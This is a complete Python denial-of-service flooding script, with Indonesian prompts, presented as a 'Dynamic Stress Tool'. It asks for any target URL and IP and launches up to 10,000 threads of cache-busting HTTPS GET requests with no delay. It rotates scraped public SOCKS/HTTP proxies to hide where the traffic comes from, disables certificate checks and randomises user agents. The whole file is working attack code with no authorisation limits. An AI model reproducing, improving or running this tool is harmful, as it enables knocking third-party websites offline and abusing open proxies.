#Osmond
import threading
import socket
import ssl
import random
import time
import json
import os
import sys
import logging
from datetime import datetime
import requests
import socks
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import selectors
import argparse
import signal
import re

log_filename = f"stress_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler(sys.stdout)
    ]
)

PORT = 443
THREADS = 10000
DELAY = 0
DURATION = 60
PROXY_TIMEOUT = 2
PROXY_FILE = "proxies.txt"
PROXY_SOURCES_FILE = "proxy_sources.txt"
USER_AGENTS_FILE = "user_agents.txt"
MAX_VALIDATION_WORKERS = 100
MAX_PROXIES_TO_VALIDATE = 5000
STOP_EVENT = threading.Event()

request_counter = 0
success_counter = 0
proxies_checked = 0
bytes_sent = 0
counter_lock = threading.Lock()
proxies_lock = threading.Lock()
PROXIES = []
USER_AGENTS = []

def signal_handler(sig, frame):
    STOP_EVENT.set()
    print("\n[STOP] Menghentikan semua thread...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def validate_ip(ip):
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

def load_user_agents():
    global USER_AGENTS
    if os.path.exists(USER_AGENTS_FILE):
        with open(USER_AGENTS_FILE, 'r') as f:
            USER_AGENTS = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        if not USER_AGENTS:
            logging.warning(f"File {USER_AGENTS_FILE} kosong, menggunakan user agent default.")
            USER_AGENTS = ["Mozilla/5.0 (compatible; StressTest/1.0)"]
        logging.info(f"Loaded {len(USER_AGENTS)} user agents dari {USER_AGENTS_FILE}")
    else:
        logging.warning(f"File {USER_AGENTS_FILE} tidak ditemukan, menggunakan user agent default.")
        USER_AGENTS = ["Mozilla/5.0 (compatible; StressTest/1.0)"]
    return USER_AGENTS

def load_proxies_from_file():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if '://' not in line:
                    line = f"http://{line}"
                parts = line.split("://")[1].split(":")
                if len(parts) < 2:
                    continue
                try:
                    host = parts[0]
                    port = int(parts[1])
                    protocol = line.split("://")[0].lower()
                    if len(parts) > 2:
                        user = parts[2]
                        passw = ":".join(parts[3:])
                        proxies.append({"url": line, "type": protocol, "speed": 0})
                    else:
                        proxies.append({"url": line, "type": protocol, "speed": 0})
                except ValueError:
                    continue
        logging.info(f"Loaded {len(proxies)} proxies dari {PROXY_FILE}")
    else:
        logging.warning(f"File {PROXY_FILE} tidak ditemukan.")
    return proxies[:MAX_PROXIES_TO_VALIDATE]

def save_proxies():
    with proxies_lock:
        with open(PROXY_FILE, 'w') as f:
            for p in PROXIES:
                f.write(f"{p['url']}\n")
        logging.info(f"Proxy list disimpan ke {PROXY_FILE}")

def load_proxy_sources():
    if os.path.exists(PROXY_SOURCES_FILE):
        with open(PROXY_SOURCES_FILE, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith('#') and line.startswith(('http://', 'https://'))]
        if not urls:
            logging.warning(f"File {PROXY_SOURCES_FILE} kosong atau tidak ada URL valid.")
            return []
        logging.info(f"Loaded {len(urls)} proxy sources dari {PROXY_SOURCES_FILE}")
        return urls
    else:
        logging.warning(f"File {PROXY_SOURCES_FILE} tidak ditemukan.")
        return []

def get_proxies_from_urls():
    urls = load_proxy_sources()
    if not urls:
        logging.warning("Tidak ada sumber proxy, menggunakan koneksi langsung.")
        return []
    proxies = []
    for url in urls:
        try:
            logging.info(f"Download proxy dari {url}")
            resp = requests.get(url, timeout=10)
            data = resp.text
            for line in data.splitlines():
                line = line.strip()
                if ':' in line and not line.startswith('#'):
                    if 'socks5' in url.lower():
                        proxies.append({"url": f"socks5://{line}", "type": "socks5", "speed": 0})
                    elif 'socks4' in url.lower():
                        proxies.append({"url": f"socks4://{line}", "type": "socks4", "speed": 0})
                    else:
                        proxies.append({"url": f"http://{line}", "type": "http", "speed": 0})
        except Exception as e:
            logging.error(f"Error download {url}: {e}")
    proxies = list({p['url']: p for p in proxies}.values())
    logging.info(f"Total {len(proxies)} proxy dari sumber online.")
    return proxies[:MAX_PROXIES_TO_VALIDATE]

def add_manual_proxies():
    proxies = []
    print("Masukkan proxy manual (format: protocol://ip:port atau protocol://ip:port:username:password)")
    print("Contoh: http://192.168.1.1:8080:user:pass")
    print("Ketikan 'done' untuk selesai.")
    while len(proxies) < MAX_PROXIES_TO_VALIDATE:
        line = input("Proxy: ").strip()
        if line.lower() == 'done':
            break
        if ':' in line:
            if '://' not in line:
                line = f"http://{line}"
            try:
                parts = line.split("://")[1].split(":")
                host = parts[0]
                port = int(parts[1])
                protocol = line.split("://")[0].lower()
                if len(parts) > 2:
                    user = parts[2]
                    passw = ":".join(parts[3:])
                    proxies.append({"url": line, "type": protocol, "speed": 0})
                else:
                    proxies.append({"url": line, "type": protocol, "speed": 0})
            except ValueError:
                print(f"Format proxy invalid: {line}")
                continue
    logging.info(f"Tambahkan {len(proxies)} proxy manual.")
    return proxies

def validate_and_test_proxy(proxy, pbar):
    if STOP_EVENT.is_set():
        return False
    global proxies_checked
    start_test = time.time()
    try:
        p_type, host, port, user, passw = parse_proxy_full(proxy['url'])
        s = socks.socksocket()
        if user and passw:
            s.set_proxy(p_type, host, port, username=user, password=passw)
        else:
            s.set_proxy(p_type, host, port)
        s.settimeout(PROXY_TIMEOUT)
        s.connect((TARGET_IP, PORT))
        speed = time.time() - start_test
        s.close()
        proxy['speed'] = speed
        with proxies_lock:
            PROXIES.append(proxy)
        with counter_lock:
            proxies_checked += 1
            pbar.update(1)
        return True
    except Exception as e:
        with counter_lock:
            proxies_checked += 1
            pbar.update(1)
        return False

def parse_proxy_full(proxy_url):
    if '://' not in proxy_url:
        proxy_url = f"http://{proxy_url}"
    protocol = proxy_url.split("://")[0].lower()
    rest = proxy_url.split("://")[1]
    parts = rest.split(":")
    host = parts[0]
    port = int(parts[1])
    if len(parts) > 2:
        user = parts[2]
        passw = ":".join(parts[3:])
        return get_proxy_type(protocol), host, port, user, passw
    return get_proxy_type(protocol), host, port, None, None

def get_proxy_type(protocol):
    if protocol == "socks5":
        return socks.SOCKS5
    elif protocol == "socks4":
        return socks.SOCKS4
    else:
        return socks.HTTP

def validate_proxies_background(proxy_list, pbar):
    with ThreadPoolExecutor(max_workers=MAX_VALIDATION_WORKERS) as executor:
        futures = [executor.submit(validate_and_test_proxy, proxy, pbar) for proxy in proxy_list]
        for future in futures:
            if STOP_EVENT.is_set():
                executor._threads.clear()
                break
    logging.info(f"Selesai validasi proxy. Total aktif: {len(PROXIES)}")
    save_proxies()

def create_ssl_context():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context

def attack(pbar):
    global request_counter, success_counter, bytes_sent
    context = create_ssl_context()
    sel = selectors.DefaultSelector()
    retries = 3
    while not STOP_EVENT.is_set():
        with proxies_lock:
            if not PROXIES:
                proxy = {"url": "direct", "type": "direct", "speed": 0}
            else:
                proxy = random.choice(PROXIES)
        for attempt in range(retries):
            try:
                if proxy['url'] == "direct":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s = context.wrap_socket(s, server_hostname=TARGET_HOST)
                else:
                    p_type, host, port, user, passw = parse_proxy_full(proxy['url'])
                    s = socks.socksocket()
                    if user and passw:
                        s.set_proxy(p_type, host, port, username=user, password=passw)
                    else:
                        s.set_proxy(p_type, host, port)
                s.settimeout(PROXY_TIMEOUT)
                s.connect((TARGET_IP, PORT))
                sel.register(s, selectors.EVENT_WRITE)
                for _ in range(3):
                    if STOP_EVENT.is_set():
                        break
                    rand_query = "?" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12))
                    request_path = TARGET_PATH + rand_query
                    request = (
                        f"GET {request_path} HTTP/1.1\r\n"
                        f"Host: {TARGET_HOST}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: text/html,application/xhtml+xml\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Cache-Control: no-cache\r\n\r\n"
                    ).encode()
                    s.send(request)
                    with counter_lock:
                        request_counter += 1
                        success_counter += 1
                        bytes_sent += len(request)
                        pbar.update(1)
                sel.unregister(s)
                s.close()
                break
            except Exception as e:
                if attempt == retries - 1:
                    with proxies_lock:
                        if proxy in PROXIES:
                            PROXIES.remove(proxy)
                    proxy = {"url": "direct", "type": "direct", "speed": 0}
                continue
        time.sleep(DELAY)

def test_connection():
    try:
        context = create_ssl_context()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(PROXY_TIMEOUT)
        s = context.wrap_socket(s, server_hostname=TARGET_HOST)
        s.connect((TARGET_IP, PORT))
        s.close()
        logging.info("Koneksi ke target berhasil.")
        return True
    except Exception as e:
        logging.error(f"Koneksi gagal: {e}")
        return False

def sort_proxies_periodically():
    while not STOP_EVENT.is_set():
        with proxies_lock:
            PROXIES.sort(key=lambda x: x['speed'])
        time.sleep(5)

def main():
    global start_time, DURATION, THREADS, MAX_VALIDATION_WORKERS, MAX_PROXIES_TO_VALIDATE, TARGET_URL, TARGET_HOST, TARGET_IP, TARGET_PATH
    socket.setdefaulttimeout(PROXY_TIMEOUT)

    parser = argparse.ArgumentParser(description="Dynamic Stress Tool")
    parser.add_argument("duration", type=int, help="Durasi serangan (detik, 0 untuk unlimited)")
    parser.add_argument("--threads", type=int, default=THREADS, help="Jumlah thread")
    parser.add_argument("--max-workers", type=int, default=MAX_VALIDATION_WORKERS, help="Jumlah worker validasi")
    parser.add_argument("--max-proxies", type=int, default=MAX_PROXIES_TO_VALIDATE, help="Maksimum proxy untuk validasi")
    args = parser.parse_args()

    DURATION = args.duration if args.duration != 0 else float('inf')
    THREADS = args.threads
    MAX_VALIDATION_WORKERS = args.max_workers
    MAX_PROXIES_TO_VALIDATE = args.max_proxies

    load_user_agents()

    print("Masukkan detail target:")
    while True:
        TARGET_URL = input("TARGET_URL (contoh: https://example.com): ").strip()
        if TARGET_URL.startswith(("http://", "https://")):
            break
        print("Error: TARGET_URL harus dimulai dengan http:// atau https://")

    while True:
        TARGET_HOST = input("TARGET_HOST (contoh: example.com): ").strip()
        if re.match(r"^[a-zA-Z0-9.-]+$", TARGET_HOST):
            break
        print("Error: TARGET_HOST harus berupa hostname valid (tanpa http://)")

    while True:
        TARGET_IP = input("TARGET_IP (contoh: 192.168.1.1): ").strip()
        if validate_ip(TARGET_IP):
            break
        print("Error: TARGET_IP harus dalam format IPv4 (xxx.xxx.xxx.xxx)")

    TARGET_PATH = input("TARGET_PATH (contoh: / atau /path/to/page, tekan Enter untuk default '/'): ").strip()
    if not TARGET_PATH:
        TARGET_PATH = "/"
    elif not TARGET_PATH.startswith("/"):
        TARGET_PATH = "/" + TARGET_PATH

    if not test_connection():
        sys.exit(1)

    print("\nPilih sumber proxy:")
    print("1. Online (dari proxy_sources.txt)")
    print("2. Input manual (misalnya, dari Labs)")
    print("3. Dari file proxies.txt")
    choice = input("Pilih (1/2/3): ").strip()
    if choice == "1":
        proxy_list = get_proxies_from_urls()
    elif choice == "2":
        proxy_list = add_manual_proxies()
    elif choice == "3":
        proxy_list = load_proxies_from_file()
    else:
        logging.warning("Pilihan tidak valid, menggunakan sumber online.")
        proxy_list = get_proxies_from_urls()

    if not proxy_list:
        global PROXIES
        PROXIES = [{"url": "direct", "type": "direct", "speed": 0}]
        logging.warning("Menggunakan koneksi langsung.")

    print(f"[TARGET] {TARGET_URL} (IP: {TARGET_IP})")
    print(f"[INFO] Thread: {THREADS} | Durasi: {DURATION if DURATION != float('inf') else 'Unlimited'}s | Delay: {DELAY}s")
    print(f"[PROXY] Memulai validasi & serangan bersamaan | Log: {log_filename}")
    print("[PERINGATAN] Tekan Ctrl+C untuk stop.\n")

    proxy_pbar = tqdm(total=len(proxy_list), desc="Proxies Checked", unit="proxy")
    attack_pbar = tqdm(total=None, desc="Requests Sent", unit="req")

    start_time = time.time()
    validation_thread = threading.Thread(target=validate_proxies_background, args=(proxy_list, proxy_pbar), daemon=True)
    validation_thread.start()

    sort_thread = threading.Thread(target=sort_proxies_periodically, daemon=True)
    sort_thread.start()

    for _ in range(THREADS):
        t = threading.Thread(target=attack, args=(attack_pbar,), daemon=True)
        t.start()

    last_time = time.time()
    try:
        while DURATION == float('inf') or (time.time() - start_time < DURATION):
            elapsed = int(time.time() - start_time)
            with counter_lock:
                current_rps = request_counter / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
                print(f"\r[RUNNING] {elapsed}s | Total Req: {request_counter} | RPS: {current_rps:.0f} | Success: {success_counter} | Proxy: {len(PROXIES)}", end="")
            last_time = time.time()
            time.sleep(1)
    except KeyboardInterrupt:
        STOP_EVENT.set()
    finally:
        proxy_pbar.close()
        attack_pbar.close()

    total_time = time.time() - start_time
    avg_rps = request_counter / total_time if total_time > 0 else 0
    success_rate = (success_counter / request_counter * 100) if request_counter > 0 else 0
    avg_proxy_speed = sum(p['speed'] for p in PROXIES) / len(PROXIES) if PROXIES else 0
    data_sent_mb = bytes_sent / (1024 * 1024)
    print(f"\n[DONE] Total waktu: {total_time:.1f}s | Total Req: {request_counter} | Avg RPS: {avg_rps:.0f}")
    print(f"[METRIK] Success Rate: {success_rate:.1f}% | Proxy Aktif: {len(PROXIES)} | Proxies Checked: {proxies_checked} | Avg Proxy Speed: {avg_proxy_speed:.3f}s")
    print(f"[DATA] Total Data Terkirim: {data_sent_mb:.2f} MB | Log: {log_filename}")
    print(f"Cek target: curl -I {TARGET_URL}")
    save_proxies()

if __name__ == "__main__":
    main()